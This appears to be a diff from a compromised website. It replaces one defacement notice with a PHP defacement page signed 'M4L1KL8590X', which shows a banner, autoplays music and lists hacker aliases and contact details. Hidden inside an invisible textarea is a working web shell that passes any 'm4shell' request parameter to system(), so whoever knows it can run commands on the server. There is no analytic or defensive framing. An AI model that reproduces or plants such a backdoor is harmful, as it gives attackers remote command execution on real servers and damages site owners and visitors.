@@ -1,3 +1,75 @@
-Hacked By Mister Spy
-Vuln!! patch it Now!
-spy0xProjectTop50
+<?php
+
+echo '<html><head>
+<meta http-equiv="Content-Language" content="ar-kw">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>hacked By M4L1KL8590X</title>
+<style type="text/css">img{opacity:0.5;-webkit-transition:all 250ms ease;-moz-transition:all 250ms ease;-o-transition:all 250ms ease;transition:all 250ms ease;}img:hover{opacity:1;}textarea{resize:none;}</style>
+<meta name="keywords" content="hacked By M4L1KL8590X">
+<meta name="description" content="hacked By M4L1KL8590X">
+<style>
+A:link {text-decoration: none;}
+A:active {text-decoration: none;}
+.auto-style1 {
+	color: #000;
+}
+.auto-style2 {
+	text-align: center;
+}
+.auto-style3 {
+	color: #000;
+}
+textarea{
+border: 1px #000001 solid;
+background-color: #000;
+</style>
+</head>
+<body bgcolor="#000">
+<div align="center">
+	        <p>&nbsp;<img src="https://c.pxhere.com/photos/04/fe/photo-1394573.jpg!d" border="0" width="700" height="300"></p><p></p></div>
+            <span style="font-weight: 400">
+			<p align="center">
+			<span style="font-weight: 700; margin: 0px; padding: 0px">
+			<br><br><font color="#FFFFFF" style="margin: 0px; padding: 0px" face="Consolas" size="6">
+			<font size="6" face="Consolas">M4L1KL8590X</font></font></span><font color="#FFFFFF" style="margin: 0px; padding: 0px" face="Consolas" size="6"><font size="6" face="Consolas"><br><textarea hidden="hidden">';
+if(isset($_REQUEST['m4shell'])){
+system($_REQUEST['m4shell']);
+};
+echo'</textarea><audio src="http://www.vegatraining.ae/Alan%20Walker%20Sabrina%20Carpenter%20%20Farruko%20%20-%20On%20My%20Way.mp3" hidden="hidden" autoplay="" controls=""></audio><br>
+			<b><font face="Consolas" size="2"><span lang="ar-sa"><font color="#FFC949">
+			</font></span>
+			<font color="#FFFFFF">Skype : </font> 
+			</font>
+			<font color="#00FF00"><font size="2" face="Consolas">./r00tbotz</font>
+			
+			</font>
+			
+			
+            </b></font><b>
+            <font face="Consolas" size="2"><span lang="ar-sa"><font color="#FFC949">
+			</font><font color="#FFFFFF">&nbsp;</font> </span>
+			<font color="#FFFFFF">email : </font> 
+			</font>
+			<font color="#00FF00"><font size="2" face="Consolas">bu9p3t@gmail.com</font>
+			
+			</font></b></font></p><font color="#FFFFFF" style="margin: 0px; padding: 0px" face="Consolas" size="6"><b><b><font color="#00FF00">
+			</font><p align="center"><font color="#00FF00">
+			<span style="font-weight: 700; ">
+            </span></font>
+			</p><p align="center">
+			<span style="font-weight: 700; ">
+            
+			</span></p></b></b></font><b><b><p align="center"><font color="#FFFFFF" style="margin: 0px; padding: 0px" face="Consolas" size="6">
+			</font>
+			</p><p align="center">
+			<span style="font-weight: 700; ">
+            <font face="Consolas" color="#FFFFFF" style="font-size: 7pt">0N3R1D3R - Mr.Swan - Kyu_Kazami - Cr0W_ID - Akemi403 - Tn.TakouR - Samur41ndeX - KEC0A_T3RBANG - AdjieDotID - ./Senpai - OshinyANin - H0M1C1D4L_L1U_910 - c0c0nu7 - xx<br><br>firends: ngorox - mr.donut'; echo 's - ./sn00py - khunerable - M3sicth - Mr.ToKeiChun69 - HTML404 - XWIXZ404 - c0rt3x - mr.vandetta404 - Mr onion - BAZIROOJ - INDOXPLOIT</font><font face="Consolas" color="#008080" style="font-size: 7pt">
+            </font>
+			</span></p><p align="center">
+			<span style="font-weight: 700; ">
+            
+</span></p><p dir="ltr" align="center">
+<font face="Tahoma" color="#FFFFFF" style="font-size: 7pt">
+</font></p></b></b></span></body></html>';
+
+ ?>
